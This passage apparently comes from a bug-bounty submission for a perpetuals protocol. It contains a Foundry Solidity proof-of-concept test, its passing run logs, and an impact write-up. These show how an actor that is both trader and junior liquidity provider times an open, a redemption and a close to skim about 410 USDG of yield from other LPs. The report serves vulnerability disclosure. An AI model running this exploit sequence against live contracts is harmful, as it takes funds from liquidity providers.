        // 7. Actor closes the full position skew-reducing through the router: the fresh
        //    close VPI at the post-redemption depth is clamped one-sidedly to -V and the
        //    rebate V - closeFee - carry is paid from pool free cash after trader claims.
        r.poolAssetsBeforeClose = pool.totalAssets();
        vm.warp(t1 + 60);
        _commitAndExecute(ACTOR, _request(CfdTypes.Side.LONG, ACTOR_SIZE, 0, type(uint256).max, true));
        r.balanceAfterClose = clearinghouse.balanceAssets(ACTOR);
        r.poolAssetsAfterClose = pool.totalAssets();
        (uint256 remainingSize,,,,,,) = engine.positions(ACTOR);
        assertEq(remainingSize, 0, "position must be fully closed");

        r.wealthEnd = _wealth(ACTOR);
    }

    function test_ExitLeg_RevenueBookedAndRebateReclaimed() public {
        RunResult memory a = _runScenario();

        // A. Open-side VPI V is booked at once as arrived pool revenue.
        assertGt(a.vpiPaid, 0, "skew-increasing open must pay positive VPI");
        assertApproxEqAbs(
            a.poolAssetsDeltaAtOpen, a.vpiPaid, 2, "open-side VPI must be booked as CashArrived pool revenue"
        );
        emit log_named_uint("V paid by the actor open, USDG", a.vpiPaid / 1e6);
        emit log_named_uint("pool asset rise at open, USDG", a.poolAssetsDeltaAtOpen / 1e6);

        // C. The close pays an action rebate ~= V - closeFee(200) - carry from pool cash.
        uint256 closeFee = ((ACTOR_SIZE / 1e20) * PRICE) * 4 / 10_000; // 4 bps of 500k
        uint256 balanceRiseAtClose = a.balanceAfterClose - a.balanceAfterOpen;
        uint256 poolDropAtClose = a.poolAssetsBeforeClose - a.poolAssetsAfterClose;
        emit log_named_uint("balance rise at close (rebate), USDG", balanceRiseAtClose / 1e6);
        emit log_named_uint("pool asset drop at close, USDG", poolDropAtClose / 1e6);
        emit log_named_uint("expected rebate V-fee, USDG", (a.vpiPaid - closeFee) / 1e6);
        assertGt(
            balanceRiseAtClose,
            a.vpiPaid - closeFee - 20e6,
            "close must rebate ~= V - closeFee - carry to the trader from pool cash"
        );
        assertLe(balanceRiseAtClose, a.vpiPaid, "lifetime clamp bounds the rebate by the paid accrual V");

        // B. Same-epoch redemption pricing. A second control run in the same test function
        // would inherit this run's state, so the control is arithmetic: the identical funded
        // shares priced at the identical post-reconcile principal minus the actor's own V
        // (the only difference the actor's open makes to that principal; the third-party
        // skew trader's revenue and the senior coupon are common to both worlds).
        uint256 counterfactualAssets = IHousePoolRedemptionMathSidecar(housePoolRedemptionMathSidecar)
            .netAssetsForShares(
                a.fundedShares, a.juniorPrincipalAtPricing - a.vpiPaid, a.juniorSupplyAtPricing, 1, 1000, 0
            );
        uint256 redemptionExcess = a.redeemedAssets - counterfactualAssets;
        emit log_named_uint("redemption excess from own VPI, USDG", redemptionExcess / 1e6);
        assertGt(redemptionExcess, 0, "redemption must be priced at the principal including the actor's own V");
        emit log_named_uint("actor junior share fraction x1e6", (a.fundedShares * 1e6) / a.juniorSupplyAtPricing);

        // The rebate outflow lands on the remaining junior LPs at the next reconcile
        // (junior-first loss; the post-settle junior principal far exceeds it).
        uint256 juniorAfterSettle = a.juniorPrincipalAtPricing - a.redeemedAssets;
        emit log_named_uint("junior principal after actor exit, USDG", juniorAfterSettle / 1e6);
        assertGt(
            juniorAfterSettle, balanceRiseAtClose, "remaining junior principal must absorb the full rebate (junior-first loss)"
        );

        // D. Combined attacker profit vs skipping the trader legs: the LP-side excess plus
        //    the trader-leg net, measured as the actor's total USDG (wallet + clearinghouse)
        //    change over the whole cycle minus the redemption proceeds. Any execution bounty
        //    the actor pays itself as its own keeper nets out inside that total.
        int256 traderLegNet = int256(a.wealthEnd) - int256(a.wealthBeforeAttack) - int256(a.redeemedAssets);
        emit log_named_int("trader-leg net (open fee + V - rebate), USDG", traderLegNet / 1e6);
        int256 attackerProfit = int256(redemptionExcess) + traderLegNet;
        emit log_named_int("attacker total profit vs no-trader-legs (USDG)", attackerProfit / 1e6);
        assertGt(attackerProfit, 0, "dual-role cycle must be net profitable at release parameters");
    }
}
```

Executed result. The command above was run inside the perps package and the single test passed:

```
Ran 1 test for test/poc/vpi-epoch-redemption-timing/ProofVpiEpochRedemptionTiming.t.sol:ProofVpiEpochRedemptionTiming
[PASS] test_ExitLeg_RevenueBookedAndRebateReclaimed() (gas: 9595012)
Logs:
  V paid by the actor open, USDG: 1623
  pool asset rise at open, USDG: 1623
  balance rise at close (rebate), USDG: 1422
  pool asset drop at close, USDG: 1422
  expected rebate V-fee, USDG: 1423
  redemption excess from own VPI, USDG: 811
  actor junior share fraction x1e6: 499875
  junior principal after actor exit, USDG: 2003979
  trader-leg net (open fee + V - rebate), USDG: -400
  attacker total profit vs no-trader-legs (USDG): 410

Suite result: ok. 1 passed; 0 failed; 0 skipped; finished in 18.10ms (11.88ms CPU time)

Ran 1 test suite in 18.88ms (18.10ms CPU time): 1 tests passed, 0 failed, 0 skipped (1 total tests)
```

Final impact assertions. The test proves the accepted impact, theft of unclaimed yield, through four assertions on one run:

- The open books `V = 1,624` USDG as `CashArrived` revenue: `pool.totalAssets()` rises by exactly `V` (assertion A).
- The matured junior redemption is funded at the post-reconcile principal that includes the actor's own still-reversible `V`, so it returns `redemptionExcess = 811` USDG over the no-`V` counterfactual priced with the identical funded shares and supply. This excess equals the actor's junior share fraction (0.499875) times `V` (assertion B).
- The skew-reducing close pays the one-sided-clamped rebate `1,423` USDG from pool free cash, bounded above by `V` (the clamp holds) and close to `V - closeFee - carry` (assertion C). The remaining junior principal (2,003,979 USDG) exceeds the rebate, so the outflow is absorbed junior-first by the incumbent liquidity providers who did not time their exit.
- The combined dual-role cycle nets the untrusted actor `+410` USDG while the incumbent junior liquidity providers are left short by the value it captured (assertion D).

Reproducibility. Pinned commit [a82d4fefb02768e5b3bddcc97dee371eee24fea8](https://github.com/immunefi-team/audit-comp-plether/commit/a82d4fefb02768e5b3bddcc97dee371eee24fea8); Foundry (forge) with Solidity 0.8.35 and via-IR per the perps package `foundry.toml`; no fork and no network access (block number not applicable); only the out-of-scope `MockSettlementToken` and `MockPyth` are mocked, and no contract in scope is modified.

